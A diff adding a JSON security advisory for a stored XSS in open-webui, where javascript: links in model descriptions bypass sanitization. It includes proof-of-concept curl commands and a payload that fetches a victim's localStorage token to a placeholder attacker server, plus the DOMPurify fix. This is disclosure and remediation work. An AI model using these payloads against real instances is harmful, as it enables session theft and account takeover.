@@ -1,0 +1,223 @@
+{
+  "id": "GHSA-gf5m-wcrh-7928",
+  "modified": "2026-05-08T19:17:54.913282Z",
+  "published": "2026-05-08T19:00:28Z",
+  "aliases": [
+    "CVE-2026-44721"
+  ],
+  "summary": "open-webui Vulnerable to Stored XSS via Model Description",
+  "details": "\u003e [!IMPORTANT]\n\u003e  Relationship to CVE-2024-7990\n\n\u003e CVE-2024-7990 (issued by huntr.dev, March 2025) describes a stored XSS in the same field — the model description — but exploits a different bypass mechanism: a second-order injection through the sanitizeResponseContent function's video-tag placeholder restoration logic in v0.3.x. That bypass was closed in v0.4.0 by removing the video exemption from the sanitizer.\n\nThe vulnerability described in this advisory is structurally distinct: a markdown-link payload with a javascript: URI passes through sanitizeResponseContent unchanged (no angle brackets), is then parsed by marked.parse() into an `\u003ca href=\"javascript:...\"\u003e` element, and rendered live by `{@html}`. This is a pipeline-ordering flaw where the dangerous construct is introduced after sanitization completes. Removing the video exemption has no effect on this primitive.\n\nAffected range: v0.3.5 through v0.8.12 inclusive. Fixed in: v0.9.0 (commit 5eab125, which wraps marked.parse() output in DOMPurify.sanitize).\n\nBoth vulnerabilities are independently fixable under CVE rule 4.2.11. CVE assignment for this advisory has been requested separately on that basis.\n\n### Summary\n\nThis is a stored cross-site scripting (XSS) vulnerability that allows any authenticated user with model creation permission (workspace.models) to execute arbitrary JavaScript in the browser of any other user (including admins) who views the malicious model in the chat UI.\n\n### Details\n\nRoot Cause:\nModel descriptions are rendered in two Svelte components via this chain:\n`sanitizeResponseContent(description)  →  .replaceAll('\\n', '\u003cbr\u003e')  →  marked.parse()  →  {@html ...}`\n\nThe model description is stored in the database without prior sanitization. Then uses this sanitization function before applying the results to the description.\n\n`index.ts:82-92`\n```ts\nexport const sanitizeResponseContent = (content: string) =\u003e {\n    return content\n        .replace(/\u003c\\|[a-z]*$/, '')       // strip incomplete \u003c|tokens\n        .replace(/\u003c\\|[a-z]+\\|$/, '')     // strip incomplete \u003c|token| \n        .replace(/\u003c$/, '')               // strip trailing \u003c\n        .replaceAll('\u003c', '\u0026lt;')         // escape \u003c to \u0026lt;\n        .replaceAll('\u003e', '\u0026gt;')         // escape \u003e to \u0026gt;\n        .replaceAll(/\u003c\\|[a-z]+\\|\u003e/g, ' ') // strip \u003c|token|\u003e patterns\n        .trim();\n};\n```\nThis function was designed to sanitize HTML tags, but does not take into consideration that XSS can be triggered via `javascript:` which is the fundamental issue.\n\n`.replaceAll('\\n', '\u003cbr\u003e')` will replace newlines with `\u003cbr\u003e` tags, and since payload can be written without newlines, its unaffected.\n\n`marked` sees `[text](url)` and generated an anchor tag and does not block the payload of `javascript:`.\n\nSvelte's `{@html}` directive inserts raw HTML into the DOM without escaping, creating the vulnerability.\n\nAffected files:\n`src/lib/components/chat/Placeholder.svelte` (lines 177–181)\n`src/lib/components/chat/ChatPlaceholder.svelte` (lines 99–103)\n\n\n### PoC\n\nBelow is a simple PoC that will create a model with a description to trigger an alert when pressing on the hyperlink. Replace the values inside such as HOST and TOKEN with your own values using your own test server.\n\nStep 1 - Create a model with a malicious description. The token used must be from an account with either the following.\nA. Admin privileges\nB. An account with model creation permission\n\n```bash\ncurl -X POST 'http://\u003cHOST\u003e/api/v1/models/create' \\\n  -H 'Authorization: Bearer \u003cTOKEN\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"xss-test\",\n    \"name\": \"Helpful Assistant!\",\n    \"base_model_id\": \"llama3\",\n    \"meta\": {\n      \"description\": \"A helpful AI assistant. [Click here for docs](javascript:alert())\"\n    },\n    \"params\": {}\n  }'\n```\nAny authenticated user with workspace.models permission can execute this. The base_model_id should reference any model available on the instance.\n\nStep 2 - Select the model:\n\nLogin and select the created model, if you followed the PoC it will be Helpful Asisstant!\n\u003cimg width=\"1203\" height=\"718\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d649c727-276c-4011-8234-140c51a32b68\" /\u003e\n\nStep 3 - XSS Triggers:\n\nClick on the hyperlink and watch the alert trigger.\n\u003cimg width=\"1203\" height=\"718\" alt=\"image\" src=\"https://github.com/user-attachments/assets/289fc3d4-e09a-45a4-b83d-40984d47a760\" /\u003e\n\n**Below is a PoC that steals the access token from localstorage**\n\nStep 1 - Setup a local python HTTPServer\n\n`python3 -m http.sever 8080`\n\nStep 2 - Create a model with a malicious payload to steal the token from localstorage\n\n```bash\ncurl -X POST 'http://\u003cHOST\u003e/api/v1/models/create' \\\n  -H 'Authorization: Bearer \u003cTOKEN\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"xss-model\",\n    \"name\": \"Token Stealer\",\n    \"base_model_id\": \"llama3\",\n    \"meta\": {\n      \"description\": \"Advanced research model. [View benchmarks](javascript:void(fetch(`http://\u003cMALICIOUS_SERVER_IP\u003e:8080/?t=${localStorage.token}`)))\"\n    },\n    \"params\": {}\n  }'\n```\nStep 3 - Navigate to the malicious model and click on the hyperlink\n\nCheck on the local server you have set up in Step 1 and see that the token is returned within the URL.\n\u003cimg width=\"669\" height=\"50\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7933e855-cc0a-40f5-a443-5c0363b1b8fa\" /\u003e \n\n\n### Impact\n\nAs user's session is stored in LocalStorage, attacker can craft a malicious payload that reads the contents and sends it to their malicious server. Once an admin access token has been stolen, users can create a new tool to execute arbitrary code (feature of Open-WebUI).\n\nAttack Scenario \n```\n1. Attacker creates a model with a malicious description\n2. Victim selects model and clicks the hyperlink\n3. Victim authorization token is stolen\n```\nThis vulnerability affects all Open-WebUI users.\n\n### Remediation\n\nRecommended fix — wrap `marked.parse()` output with `DOMPurify.sanitize()`.\n\nIn the affected files, change\n\n```ts\n{@html marked.parse(\n    sanitizeResponseContent(description).replaceAll('\\n', '\u003cbr\u003e')\n)}\n```\n\ninto\n\n```ts\n{@html DOMPurify.sanitize(\n    marked.parse(\n        sanitizeResponseContent(description).replaceAll('\\n', '\u003cbr\u003e')\n    )\n)}\n```\nThis matches the pattern already used in other parts of the application such as but not limiting to `ConfirmDialog.svelte:130` and `NotebookView.svelte:77`. DOMPurify will handle the stripping of `javascript:` URIs, event handlers and other dangerous HTML by default.\n\n### AI Disclosure\n\nClaude was used to assist in:\n\nSystematic codebase searching to identify unsanitized `{@html}` rendering paths\nVerifying `marked@9.1.6` behavior with `javascript:` URIs\n\n## Credits\n\nLin, WeiChi from Sompo Holdings, Inc.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "open-webui",
+        "purl": "pkg:npm/open-webui"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.9.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.8.12",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-gf5m-wcrh-7928/GHSA-gf5m-wcrh-7928.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "open-webui",
+        "purl": "pkg:pypi/open-webui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.124",
+        "0.1.125",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.3.0",
+        "0.3.1",
+        "0.3.10",
+        "0.3.12",
+        "0.3.13",
+        "0.3.14",
+        "0.3.15",
+        "0.3.16",
+        "0.3.17",
+        "0.3.17.dev2",
+        "0.3.17.dev3",
+        "0.3.17.dev4",
+        "0.3.17.dev5",
+        "0.3.18",
+        "0.3.19",
+        "0.3.2",
+        "0.3.20",
+        "0.3.21",
+        "0.3.22",
+        "0.3.23",
+        "0.3.24",
+        "0.3.25",
+        "0.3.26",
+        "0.3.27",
+        "0.3.27.dev1",
+        "0.3.27.dev2",
+        "0.3.27.dev3",
+        "0.3.28",
+        "0.3.29",
+        "0.3.3",
+        "0.3.30",
+        "0.3.30.dev1",
+        "0.3.30.dev2",
+        "0.3.31",
+        "0.3.31.dev1",
+        "0.3.32",
+        "0.3.33",
+        "0.3.33.dev1",
+        "0.3.34",
+        "0.3.35",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.3.8",
+        "0.3.9",
+        "0.4.0",
+        "0.4.0.dev1",
+        "0.4.0.dev2",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.4.5",
+        "0.4.6",
+        "0.4.6.dev1",
+        "0.4.7",
+        "0.4.8",
+        "0.5.0",
+        "0.5.0.dev1",
+        "0.5.0.dev2",
+        "0.5.1",
+        "0.5.10",
+        "0.5.11",
+        "0.5.12",
+        "0.5.13",
+        "0.5.14",
+        "0.5.15",
+        "0.5.16",
+        "0.5.17",
+        "0.5.18",
+        "0.5.19",
+        "0.5.2",
+        "0.5.20",
+        "0.5.3",
+        "0.5.3.dev1",
+        "0.5.4",
+        "0.5.5",
+        "0.5.6",
+        "0.5.7",
+        "0.5.8",
+        "0.5.9",
+        "0.6.0",
+        "0.6.1",
+        "0.6.10",
+        "0.6.11",
+        "0.6.12",
+        "0.6.13",
+        "0.6.14",
+        "0.6.15",
+        "0.6.16",
+        "0.6.18",
+        "0.6.19",
+        "0.6.2",
+        "0.6.20",
+        "0.6.21",
+        "0.6.22",
+        "0.6.23",
+        "0.6.24",
+        "0.6.25",
+        "0.6.26",
+        "0.6.26.dev1",
+        "0.6.27",
+        "0.6.28",
+        "0.6.29",
+        "0.6.3",
+        "0.6.30",
+        "0.6.31",
+        "0.6.32",
+        "0.6.33",
+        "0.6.34",
+        "0.6.35",
+        "0.6.36",
+        "0.6.37",
+        "0.6.38",
+        "0.6.39",
+        "0.6.4",
+        "0.6.40",
+        "0.6.41",
+        "0.6.42",
+        "0.6.43",
+        "0.6.5",
+        "0.6.6",
+        "0.6.6.dev1",
+        "0.6.7",
+        "0.6.8",
+        "0.6.9",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.8.1",
+        "0.8.10",
+        "0.8.11",
+        "0.8.12",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.8.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.8.12",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-gf5m-wcrh-7928/GHSA-gf5m-wcrh-7928.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-gf5m-wcrh-7928"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-webui/open-webui"
+    }
+  ]
+}
